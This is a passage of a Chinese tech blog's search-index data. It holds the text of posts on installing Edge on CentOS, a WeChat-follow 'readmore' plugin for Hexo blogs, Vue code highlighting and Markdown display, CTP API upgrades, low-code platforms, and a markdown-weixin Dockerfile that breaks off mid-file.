Spring 官方文档 @CrossOrigin 注解解决跨域问题 CORS 与 @CrossOrigin 注解底层实现详解 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Centos7 安装 Edge 浏览器",url:"/posts/350db602.html",text:'下载在 Edge 的 官网，手动下载最新版的 RPM 安装包，或者使用以下命令进行下载： 1$ wget https://packages.microsoft.com/yumrepos/edge/microsoft-edge-dev-101.0.1193.0-1.x86_64.rpm 安装依赖1# yum install libatomic 提示 若不提前安装 libatomic 库，则安装 Edge 时会出现以下错误信息。 123错误：依赖检测失败： libatomic.so.1()(64bit) 被 microsoft-edge-dev-101.0.1193.0-1.x86_64 需要 libatomic.so.1(LIBATOMIC_1.0)(64bit) 被 microsoft-edge-dev-101.0.1193.0-1.x86_64 需要 安装 Edge 浏览器1# rpm -ivh microsoft-edge-dev-101.0.1193.0-1.x86_64.rpm var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Hexo 博客导流微信公众号",url:"/posts/c86372a2.html",text:"前言Hexo 博客建议安装 hexo-readmore 插件，将 TechGrow 的免费微信公众号导流工具整合到博客中，用户扫码关注微信公众号后可以解锁全站文章，让微信公众号的粉丝数躺着增长。 提示 TechGrow 开放平台的 官方文档 特色功能 兼容主流的 Hexo 主题 支持随机为博客添加引流功能 支持关闭某篇文章的引流功能 支持查询用户解锁文章的历史记录 支持自定义或者动态计算文章内容的预览高度 支持自定义 CSS 样式，轻松适配不同风格的博客 注册博客浏览器访问 TechGrow 的官网 ，注册并登录账号后，进入博客的后台管理页面。首先点击左侧的菜单 博客注册，然后点击 新增 按钮，添加自己博客的信息。博客注册成功后，记录下 博客 ID，后面的步骤会使用到 设置公众号在微信公众号的后台管理页面，菜单栏里选择 自动回复 - 关键词回复，启用 自动回复，然后点击 添加回复 按钮： 填写 规则名称、关键词（当初你在 TechGrow 中设置的）、回复内容 选择 文字，然后 回复文字 的内容填写获取博客解锁验证码的链接，如下所示（请自行更改 xxxxx-xxxxxxxxx-xxx 为你申请到的博客 ID） 1&lt;a href=\"https://open.techgrow.cn/#/readmore/captcha/generate?blogId=xxxxx-xxxxxxxxx-xxx\"&gt;点击链接，获取博客解锁验证码&lt;/a&gt; 此时，当读者关注你的微信公众号，并输入关键词后（比如我设置的关键词就是 tech），那么读者就会自动接收到获取博客解锁验证码的链接 安装插件 运行 npm install 命令安装插件到本地项目 1$ npm install hexo-readmore --save 配置 Hexo编辑 Hexo 自身的 _config.yml 配置文件，新增插件的配置信息（请自行更改博客相关的信息），如下所示： 1234567891011121314151617181920212223readmore: # 是否启用 enable: true # 已申请的博客 ID blogId: '18762-1609305354821-257' # 已申请的微信公众号名称 name: '全栈技术驿站' # 已申请的微信公众号回复关键词 keyword: 'tech' # 已申请的微信公众号二维码图片 qrcode: 'https://www.techgrow.cn/img/wx_mp_qr.png' # 自定义的 JS 资源链接，可用于 CDN 加速 libUrl: 'https://qiniu.techgrow.cn/readmore/dist/readmore.js' # 自定义的 CSS 资源链接，可用于适配不同风格的博客 cssUrl: 'https://qiniu.techgrow.cn/readmore/dist/hexo.css' # 文章内容的预览高度 height: 'auto' # 文章解锁后凭证的有效天数 expires: 365 # 定时校验凭证有效性的时间间隔（秒） interval: 60 # 每篇文章随机添加微信公众号引流工具的概率，有效范围在 0.1 ~ 1 之间，1 则表示所有文章默认都自动添加引流工具 random: 1 或者打开 TechGrow 的博客后台管理页面，点击博客列表中右侧的 使用 链接，将窗口里的 YAML 配置内容复制到 Hexo 自身的 _config.yml 配置文件即可 参数说明 参数 类型 必填 默认值 说明 enable Boolean 是 false - blogId String 是 - name String 是 - keyword String 是 - qrcode String 是 - libUrl String 否 https://qiniu.techgrow.cn/readmore/dist/readmore.js - cssUrl String 否 https://qiniu.techgrow.cn/readmore/dist/hexo.css - height String / Number 否 auto - expires Number 否 365 - interval Number 否 60 - random Number 否 1 - 构建 Hexo 运行 hexo clean 命令清理本地博客 1$ hexo clean 运行 hexo generate 命令构建本地博客 1$ hexo generate 运行 hexo server 命令启动本地博客服务 1$ hexo server 验证插件效果打开文章页面，若文章自动隐藏了部分内容，并且出现了 阅读全文 按钮，则说明导流插件正常运行，如下图所示： 点击 阅读全文 按钮，会弹出微信公众号的二维码窗口，如下图所示： 取消阅读限制若希望关闭某篇文章的微信公众号导流功能，可以在文章的头模板中使用 readmore: false 配置属性，如下所示： 12345678---title: Hexo版本升级教程tags: [Hexo]readmore: falsekeywords: [Hexo, 版本升级]date: 2022-01-12 22:25:49updated: 2022-01-12 22:25:49--- 自定义样式插件默认使用了定义在 hexo.css 的 CSS 样式，你可以使用以下两种方式自定义自己的样式： 第一种方式：更改博客主题的 CSS 源码文件，将自定义的那部分 CSS 样式添加到里面 第二种方式：根据 hexo.css 创建自己的 CSS 文件（完整的），并将其存放在自己的博客里，同时通过插件的 cssUrl 配置参数来指定其访问的 URL 路径 已兼容的主题 NexT Yilia Icarus Matery Fluid Stun 在线演示 官方博客 官方微信群",tags:"静态博客"},{title:"博客导流微信公众号",url:"/posts/48b470db.html",text:'前言博客将流量导向微信公众号很简单，可以使用 TechGrow 的免费导流工具实现，用户扫码关注微信公众号后可以解锁全站文章，让微信公众号的粉丝数躺着增长。整个过程只需六步就可以搞定，适用于各类主流的博客，本文以 Hexo 的 NexT 主题博客举例。 提示 TechGrow 开放平台的 官方文档 若使用的是 Hexo 静态博客，建议直接安装 hexo-readmore 插件，详细教程可点击这里 若使用的是 VuePress 1 静态博客，建议直接安装 vuepress-plugin-readmore-popular 插件，详细教程可点击这里 若使用的是 VuePress 2 静态博客，建议直接安装 vuepress-plugin-readmore-popular-next 插件，详细教程可点击这里 特色功能 兼容主流的博客框架 支持随机为博客添加引流功能 支持查询用户解锁文章的历史记录 支持自定义或者动态计算文章内容的预览高度 支持自定义 CSS 样式，轻松适配不同风格的博客 第一步：注册博客浏览器访问 TechGrow 的官网 ，注册并登录账号后，进入博客的后台管理页面。首先点击左侧的菜单 博客注册，然后点击 新增 按钮，添加自己博客的信息。博客注册成功后，记录下 博客 ID，后面的步骤会使用到 第二步：设置公众号在微信公众号的后台管理页面，菜单栏里选择 自动回复 - 关键词回复，启用 自动回复，然后点击 添加回复 按钮： 填写 规则名称、关键词（当初你在 TechGrow 中设置的）、回复内容 选择 文字，然后 回复文字 的内容填写获取博客解锁验证码的链接，如下所示（请自行更改 xxxxx-xxxxxxxxx-xxx 为你申请到的博客 ID） 1&lt;a href="https://open.techgrow.cn/#/readmore/captcha/generate?blogId=xxxxx-xxxxxxxxx-xxx"&gt;点击链接，获取博客解锁验证码&lt;/a&gt; 此时，当读者关注你的微信公众号，并输入关键词后（比如我设置的关键词就是 tech），那么读者就会自动接收到获取博客解锁验证码的链接 第三步：定位文章主体的标签元素在 Hexo 博客的 themes 目录下，找到你正在使用的主题目录，比如：next 等，具体根据你选择的主题来判断。进入主题源码的 layout 目录，找到 _macro/post.njk 模板文件，若这里有一大段与文章主体内容相关的 HTML 代码，那就说明文章主体标签元素的模板定义就在这里，示例模板代码如下： 123456789101112131415161718&lt;div class="post-block"&gt; {# Gallery support #} {{ post_gallery(post.photos) }} &lt;!-- 文章主体的标签元素 --&gt; &lt;article itemscope itemtype="http://schema.org/Article" class="post-content" lang="{{ post.lang }}"&gt; &lt;link itemprop="mainEntityOfPage" href="{{ post.permalink }}"&gt; &lt;span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"&gt; &lt;meta itemprop="image" content="{{ url_for(theme.avatar.url or theme.images + \'/avatar.gif\') }}"&gt; &lt;meta itemprop="name" content="{{ author }}"&gt; &lt;meta itemprop="description" content="{{ description }}"&gt; &lt;/span&gt; ...（省略） &lt;/article&gt;&lt;/div&gt; 另一种定位方式是打开你博客的任意一篇文章，利用 Chrome 等浏览器的元素审查功能，找到文章页面中文章主体的标签元素，比如下图中的 article 就是文章主体的标签元素： 第四步：新增文章内容 DIV 标签在文章模板文件中找到文章主体的标签元素之后，在其上一层包一层 div 标签，并将 div 标签的 id 属性设置为 readmore-container，即添加的 HTML 标签为 &lt;div id="readmore-container"&gt;，示例模板代码如下： 1234567891011121314151617181920&lt;div class="post-block"&gt; {# Gallery support #} {{ post_gallery(post.photos) }} &lt;!-- 新增的DIV标签 --&gt; &lt;div id="readmore-container"&gt; &lt;article itemscope itemtype="http://schema.org/Article" class="post-content" lang="{{ post.lang }}"&gt; &lt;link itemprop="mainEntityOfPage" href="{{ post.permalink }}"&gt; &lt;span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"&gt; &lt;meta itemprop="image" content="{{ url_for(theme.avatar.url or theme.images + \'/avatar.gif\') }}"&gt; &lt;meta itemprop="name" content="{{ author }}"&gt; &lt;meta itemprop="description" content="{{ description }}"&gt; &lt;/span&gt; ...（省略） &lt;/article&gt; &lt;/div&gt;&lt;/div&gt; 第五步：新增导流工具的 HTML 代码打开 TechGrow 的博客后台管理页面，点击博客列表中右侧的 使用 链接，将窗口里的 HTML 代码复制到第三步中找到的文章模板文件的末尾，也可以添加到主题的 footer 模板文件中，示例 HTML 代码如下图所示： 参数 必填 默认值 描述 id 是 DIV 标签的 ID blogId 是 已申请的博客 ID name 是 已申请的微信公众号名称 qrcode 是 已申请的微信公众号二维码图片 keyword 是 已申请的微信公众号回复关键词 height 否 auto 文章内容的预览高度 expires 否 365 文章解锁后凭证的有效天数 interval 否 60 定时校验凭证有效性的时间间隔（秒） type 否 other 博客类型，包括：hexo、vuepress、vuepress2、hugo、gatsby、jekyll、docsify、typecho、wordpress、other random 否 1 每篇文章随机添加微信公众号引流工具的概率，有效范围在 0.1 ~ 1 之间，1 则表示所有文章默认都自动添加引流工具 第六步：验证导流工具是否整合成功重新构建并运行博客服务后，打开文章页面，若文章自动隐藏了部分内容，并且出现了 阅读全文 按钮，则说明导流工具整合成功，如下图所示： 点击 阅读全文 按钮，会弹出微信公众号的二维码窗口，如下图所示： 使用总结 博客整合引流工具，其本质原理就是先在博客的主题源码里，找到文章的主体内容，然后在其外面包裹一层 DIV 标签（&lt;div id="readmore-container"&gt;），最后再将引流工具的 HTML 代码添加到博客文章的末尾即可。 自定义样式引流工具默认使用了定义在 readmore.css 的 CSS 样式，你可以使用以下两种方式自定义自己的样式： 第一种方式：更改博客主题的 CSS 源码文件，将自定义的那部分 CSS 样式添加到里面 第二种方式：根据 readmore.css 创建自己的 CSS 文件（完整的），并将其存放在自己的博客里，同时通过引流工具的 cssUrl 配置参数来指定其访问的 URL 路径 常见问题问题一 博客整合引流工具后，浏览器的控制台输出警告或者错误信息，且引流工具无法生效 浏览器访问博客后，按下 F12 快捷键调出调试工具，然后切换到 控制台，最后将警告或者错误信息截图，并发送到 官方微信群 或者 656418510@qq.com 邮箱，建议留言备注博客与博客主题的类型。 问题二 博客整合引流工具后，移动端的引流工具无法生效，而 PC 端却生效 考虑到用户体验的问题，在移动端默认是关闭引流功能的，请知悉。 在线演示 官方博客 官方微信群',tags:"静态博客"},{title:"Vue 页面高亮显示代码块",url:"/posts/5cf75f16.html",text:'前言Vue 页面可以基于 vue-prism-editor 实现高亮显示代码块，支持 Vue 2.x 和 Vue 3.x。 提示 vue-prism-editor 要求 Vue 的版本高于 2.6.11 若 Vue 的版本为 3.x，则需要使用 vue-prism-editor 的 feature/next 分支代码 安装模块1$ npm install vue-prism-editor --save 由于 vue-prism-editor 依赖了 prismjs，所以还需要安装 prismjs 1$ npm install prismjs --save Vue 代码在 Vue 页面中引入 vue-prism-editor 组件，完整的示例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;template&gt; &lt;prism-editor class="my-editor height-300" v-model="code" :highlight="highlighter" readonly line-numbers&gt;&lt;/prism-editor&gt;&lt;/template&gt;&lt;script&gt; // import Prism Editor import { PrismEditor } from \'vue-prism-editor\' import \'vue-prism-editor/dist/prismeditor.min.css\' // import highlighting library import { highlight, languages } from \'prismjs/components/prism-core\' import \'prismjs/components/prism-clike\' import \'prismjs/components/prism-javascript\' import \'prismjs/themes/prism-tomorrow.css\' export default { components: { PrismEditor }, data: () =&gt; ({ code: \'console.log("Hello World")\' }), methods: { highlighter (code) { return highlight(code, languages.js) } } }&lt;/script&gt;&lt;style&gt; /* required class */ .my-editor { /* we dont use `language-` classes anymore so thats why we need to add background and text color manually */ background: #2d2d2d; color: #ccc; /* you must provide font-family font-size line-height. Example: */ font-family: Fira code, Fira Mono, Consolas, Menlo, Courier, monospace; font-size: 14px; line-height: 1.5; padding: 5px; } /* optional class for removing the outline */ .prism-editor__textarea:focus { outline: none; } /* not required: */ .height-300 { height: 300px; }&lt;/style&gt; 提示 highlighter：定义在 methods 中的一个方法，用于将代码高亮显示 readonly：代码块是否只读（不可编辑） code：需要高亮显示的代码内容 lineNumbers：是否显示行号 演示效果 常见问题问题一如果安装 NPM 模块失败，且错误信息中有提示升级 vue@^2.6.11 版本，则根据提示升级 Vue 的版本即可： 1$ npm install vue@^2.6.11 问题二vue 与 vue-template-compiler 的版本不一致，导致 Vue 项目编译失败 首先卸载低版本的 vue-template-compiler 1$ npm uninstall vue-template-compiler 然后安装跟 vue 相同版本的 vue-template-compiler 1$ npm install vue-template-compiler@2.6.11 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"Vue 页面读取并展示 Markdown 文件",url:"/posts/df920f01.html",text:'前言如何在 Vue 中读取项目本地的 MarkDown 文件并展示在网页上呢？查阅资料后发现，一般的方案是在 Vue 页面中引入 Markdown 编辑器，然后利用编辑器的预览功能来展示 MarkDown 文件的内容。推荐使用开源的 MarkDown 编辑器 mavonEditor 或者 vue-meditor。 vue-meditor 介绍简介提示 vue-meditor 官方文档 vue-meditor Github 仓库 vue-markdown 是一款使用 marked 和 highlight.js 开发的一款 MarkDown 编辑器，主要包括三个部分： 简单版编辑器，左侧文本输入框使用 textarea 实现 专业版编辑器，左侧输入框使用 codemirror 实现 MarkDown 预览组件，可单独使用 显示效果图 vue-meditor 使用使用 NPM 安装1$ npm i -S vue-meditor 在项目中引入组件在 Vue 页面中引入 vue-meditor 的预览组件 MarkdownPreview，完整示例代码如下，编辑器的完整基本属性可查阅 官方文档 1234567891011121314151617181920212223242526272829303132333435&lt;template&gt; &lt;div class="markdown"&gt; &lt;MarkdownPreview v-model="content" :height="1024" :isPreview=true :bordered=false :copyCode=true theme="oneDark" /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import MarkdownPreview from \'vue-meditor\' export default { name: \'markdown\', data () { return { content: \'\' } }, components: { MarkdownPreview }, created () { // 读取本地的Markdown文件 this.$http.get(\'/static/guide/start.md\').then((response) =&gt; { if (response.data) { this.content = response.data } }) } }&lt;/script&gt; 值得一提的是，/static/guide/start.md 是 Vue 项目根目录下 MarkDown 文件的路径，上面的代码通过 HTTP 请求去读取 Markdown 文件，这样的优势是可以实时预览 MarDown 文件的内容。 最终实现的效果图 参考资料 Vue 使用 MarkDown Vue 读取本地 MarkDown 文件 Vue 读取展示 MarkDown 文件 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"CTP 开发随笔",url:"/posts/790d6d80.html",text:'API 版本升级提示 CTP API 版本说明 CTP API 各版本官方下载 下面将以 v6.3.15 版本升级到 v6.6.1_P1 版本举例，同样适用于将 v6.3.19_P1 版本升级到 v6.6.1_P1 第一步从官网下载 v6.6.1_P1_20210406 版本的 API，然后解压并将 .h 头文件和 .DLL 文件拷贝到 C/C++ 项目里；也就是说，将原有的 API 文件替换掉即可。 第二步v6.6.1_P1 相比 v6.3.15，其中一个不同的地方，就是函数里的结构体名称更改了。因此需要在 IDE 里全局将 CThostFtdcQueryMaxOrderVolumeField 替换为 CThostFtdcQryMaxOrderVolumeField，同时将 ReqQueryMaxOrderVolume 替换为 ReqQryMaxOrderVolume。 第三步由于 v6.6.1_P1 版本新增了一些函数，若项目的代码是基于官方的 Demo 进行二次开发的，那么则需要在下述的 C++ 源文件末尾追加以下代码： traderApi.h 1234567891011///请求查询分类合约virtual int ReqQryClassifiedInstrument(CThostFtdcQryClassifiedInstrumentField *pQryClassifiedInstrument, int nRequestID);///请求组合优惠比例virtual int ReqQryCombPromotionParam(CThostFtdcQryCombPromotionParamField *pQryCombPromotionParam, int nRequestID);///投资者风险结算持仓查询virtual int ReqQryRiskSettleInvstPosition(CThostFtdcQryRiskSettleInvstPositionField *pQryRiskSettleInvstPosition, int nRequestID);///风险结算产品查询virtual int ReqQryRiskSettleProductStatus(CThostFtdcQryRiskSettleProductStatusField *pQryRiskSettleProductStatus, int nRequestID); traderApi.cpp 123456789101112131415int CTraderApi::ReqQryClassifiedInstrument(CThostFtdcQryClassifiedInstrumentField *pQryClassifiedInstrument, int nRequestID) {};int CTraderApi::ReqQryCombPromotionParam(CThostFtdcQryCombPromotionParamField *pQryCombPromotionParam, int nRequestID) {};int CTraderApi::ReqQryRiskSettleInvstPosition(CThostFtdcQryRiskSettleInvstPositionField *pQryRiskSettleInvstPosition, int nRequestID) {};int CTraderApi::ReqQryRiskSettleProductStatus(CThostFtdcQryRiskSettleProductStatusField *pQryRiskSettleProductStatus, int nRequestID) {}; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发随笔 量化交易"},{title:"初探最流行的前端低代码平台",url:"/posts/65ee20c1.html",text:'前言在 2022 年，“低代码” 成了热门的话题，各大云厂商都在这个领域发力。那么作为普通的企业，是否也可以深度定制一套自己的 “低代码” 平台呢？ 云厂商的低代码平台阿里云阿里云推出了易搭，通过简单的拖拽、配置，即可完成业务应用的搭建。旨在为广大中小企业提供一套低成本的企业应用搭建解决方案。应用无缝植入钉钉企业工作台，随时随地、高效协同。 腾讯云腾讯云则是推出了微搭，通过行业化模板、拖放式组件和可视化配置快速构建多端应用（小程序、H5 应用、Web 应用等），打通了小程序、云函数。 开源的低代码平台基础平台amis提示 amis GitHub 仓库 amis 官方中文文档 amis 是一个低代码前端框架，它使用 JSON 配置来生成页面，可以减少页面开发工作量，极大提升效率，由百度团队开源。 用 JSON 写页面的好处 为了实现用最简单方式来生成大部分页面，amis 的解决方案是基于 JSON 来配置，它的独特好处是： 不需要懂前端：在百度内部，大部分 amis 用户之前从来没写过前端页面，也不会 JavaScript，却能做出专业且复杂的后台界面，这是所有其他前端 UI 库都无法做到的； 不受前端技术更新的影响：百度内部最老的 amis 页面是 6 年多前创建的，至今还在使用，而当年的 Angular/Vue/React 版本现在都废弃了，当年流行的 Gulp 也被 Webpack 取代了，如果这些页面不是用 amis，现在的维护成本会很高； 享受 amis 的不断升级：amis 一直在提升细节交互体验，比如表格首行冻结、下拉框大数据下不卡顿等，之前的 JSON 配置完全不需要修改； 可以完全使用 可视化页面编辑器 来制作页面；一般前端可视化编辑器只能用来做静态原型，而 amis 可视化编辑器做出的页面是可以直接上线的。 amis 的其它亮点 提供完整的界面解决方案：其它 UI 框架必须使用 JavaScript 来组装业务逻辑，而 amis 只需 JSON 配置就能完成完整功能开发，包括数据获取、表单提交及验证等功能，做出来的页面不需要经过二次开发就能直接上线； 大量内置组件（120+），一站式解决：其它 UI 框架大部分都只有最通用的组件，如果遇到一些稍微不常用的组件就得自己找第三方，而这些第三方组件往往在展现和交互上不一致，整合起来效果不好，而 amis 则内置大量组件，包括了富文本编辑器、代码编辑器、diff、条件组合、实时日志等业务组件，绝大部分中后台页面开发只需要了解 amis 就足够了； 支持扩展：除了低代码模式，还可以通过 自定义组件 来扩充组件，实际上 amis 可以当成普通 UI 库来使用，实现 90% 低代码，10% 代码开发的混合模式，既提升了效率，又不失灵活性； 容器支持无限级嵌套：可以通过嵌套来满足各种布局及展现需求； 经历了长时间的实战考验：amis 在百度内部得到了广泛使用，在 6 年多的时间里创建了 5 万页面，从内容审核到机器管理，从数据分析到模型训练，amis 满足了各种各样的页面需求，最复杂的页面有超过 1 万行 JSON 配置。 amis 不适合做什么 使用 JSON 有优点但也有明显缺点，在以下场合并不适合 amis： 大量定制 UI：JSON 配置使得 amis 更适合做有大量常见 UI 组件的页面，但对于面向普通客户（toC）的页面，往往追求个性化的视觉效果，这种情况下用 amis 就不合适，实际上绝大部分前端 UI 组件库也都不适合，只能定制开发。 极为复杂或特殊的交互： 有些复杂的前端功能，比如 可视化编辑器，其中有大量定制的拖拽操作，这种需要依赖原生 DOM 实现的功能无法使用 amis。 但对于某些交互固定的领域，比如图连线，amis 后续会有专门的组件来实现。 mometa提示 mometa GitHub 仓库 mometa 是一款面向研发的低代码元编程，代码可视编辑，辅助编码工具。 背景 mometa 不是传统主流的低代码平台（如 amis / 云凤蝶），mometa 是面向研发的、代码可视设计编辑平台，它更像是 dreamweaver、gui 可视编辑之于程序员。 特性 面向研发的代码可视化编辑，直接作用于源码 响应式布局、路由模拟、物料预览 反向定位（视图定位源码） 拖拽插入物料 拖拽移动 上下移动 删除 替换 层级选择 接入友好，Webpack&gt;=4 插件化接入 开发友好，物料库支持热更新，不破坏已有开发模式 开放物料生态，可定制团队内物料库，见 mometa-mat 多语言、多生态支持，目前暂只支持 React，后续有计划支持 Vue 解决的问题 对低代码平台不形成依赖，二次开发可以无缝进入代码开发模式 同时支持所见即所得的可视编辑，用于提效，提升开发体验 提供物料生态，可自定义物料，提升物料使用体验，提升复用率 mometa 定位更多是基于程序员本地开发的模式，新增了可视化编码的能力（修改的也是本地的代码文件本身）。它更像是辅助编码工具，而不是 No-Code (amis / 云凤蝶) 的平台方案。 Sortable提示 Sortable GitHub 仓库 Sortable 是一个用于可重新排序的拖放列表的 JavaScript 库，可实现适用于现代浏览器和触摸设备的可重新排序的拖放列表，不需要依赖 jQuery 或框架。 H5 开发H5-Dooring提示 H5-Dooring GitHub 仓库 H5-Dooring 官方 Wiki H5-Dooring 是一款功能强大，专业可靠的 H5 可视化页面配置解决方案，致力于提供一套简单方便、专业可靠、无限可能的 H5 落地页最佳实践。技术栈以 React 和 Typescript 为主， 后台采用 Nodejs 开发，正在探索 h5-lowcode 解决方案。 luban-h5提示 luban-h5 GitHub 仓库 luban-h5 官方中文文档 luban-h5 在线 Demo 演示 鲁班 H5 是基于 Vue2.0 开发，通过拖拽快速生成页面的平台，类似 易企秀、Maka、百度 H5 等平台。 quark-h5提示 quark-h5 GitHub 仓库 quark-h5 是一款基于 Vue2 + Koa2 的 H5 页面可视化制作工具，让不会写代码的人也能轻松快速上手制作 H5 页面。类似易企秀、百度 H5 等 H5 制作、建站工具。 其他开源项目 h5-factory：H5 页面制作，移动端专题活动页面可视化编辑 lz-h5-edit：随心秀（React 版 H5 微场景编辑器)，一款类似易企秀、兔展的 H5 微场景编辑器 vite-vue3-lowcode：移动端低代码平台，实现了可视化拖拽、可视化编辑器，类似易企秀的 H5 制作、建站工具、可视化搭建工具； 参考博客 云凤蝶低代码之路 搭建自己的低代码平台 云凤蝶可视化搭建的推导与实现 Vue + Koa 从零打造一个 H5 页面可视化编辑器 - quark-h5 基于 Koa2 打造属于自己的 MVC 框架，仿 Egg 的简易版本 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"Markdown 转换微信公众号文章内容",url:"/posts/1c073f45.html",text:'前言使用微信公众号编辑器有一个十分头疼的问题 —— 粘贴出来的代码，格式错乱，而且特别丑。markdown-weixin 是一款让 Markdown 转微信公众号内容的神器，能让 Markdown 内容，无需作任何调整就能一键复制到微信公众号使用，而且特别针对代码展示做了优化。 项目构建1234567891011121314# 拉取源代码$ git clone https://github.com/rqh656418510/markdown-weixin.git# 进入源代码目录$ cd markdown-weixin# 安装依赖$ npm install# 构建项目$ npm run build# 查看构建生成的文件（docs目录可直接部署到Web服务器）$ ls -al docs 演示效果 使用 Docker12345# 构建镜像# docker build -f Dockerfile -t clay/markdown-weixin:latest .# 启动容器# docker run -d -p 8080:80 clay/markdown-weixin:latest Docker 容器运行起来之后，打开浏览器访问 http://127.0.0.1:8080 即可，完整的 Dockerfile（基于 Debian 9 + Tengine） 如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879FROM node:14-stretchMAINTAINER clay&lt;clay@gmail.com&gt;# 创建用户RUN groupadd tengine &amp;&amp; useradd -g tengine tengine# 更换软件源RUN cp /etc/apt/sources.list /etc/apt/sources.list.bak &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.list &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# 安装依赖RUN apt-get -y update &amp;&amp; apt-get -y upgrade &amp;&amp; \\ apt-get -y install vim tree htop apt-utils net-tools telnet wget curl &amp;&amp; \\ apt-get -y install autoconf git build-essential libpcre3 libpcre3-dev zlib1g zlib1g.dev openssl libssl-dev &amp;&amp; \\ apt-get -y autoclean &amp;&amp; apt-get -y autoremove# 定义Tengine的版本号ENV VERSION 2.2.3# 下载并解压文件RUN mkdir -p /usr/local/src/ADD http://tengine.taobao.org/download/tengine-$VERSION.tar.gz /usr/local/srcRUN tar -xvf /usr/local/src/tengine-$VERSION.tar.gz -C /usr/local/src/# 创建安装目录ENV TENGINE_HOME /usr/local/tengineRUN mkdir -p $TENGINE_HOME# 进入解压目录WORKDIR /usr/local/src/tengine-$VERSION# 编译安装RUN ./configure \\ --user=tengine \\ --group=tengine \\ --prefix=$TENGINE_HOME \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_concat_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module \\ --with-http_upstream_consistent_hash_module \\ &amp;&amp; make \\ &amp;&amp; make install# 设置环境变量ENV PATH $PATH:$TENGINE_HOME/sbin# 定义APP目录ENV APP_HOME $TENGINE_HOME/html# 编译APP项目RUN mkdir -p /tmp/markdown-weixin \\ &amp;&amp; git clone https://github.com/rqh656418510/markdown-weixin /tmp/markdown-weixin \\ &amp;&amp; cd /tmp/markdown-weixin \\ 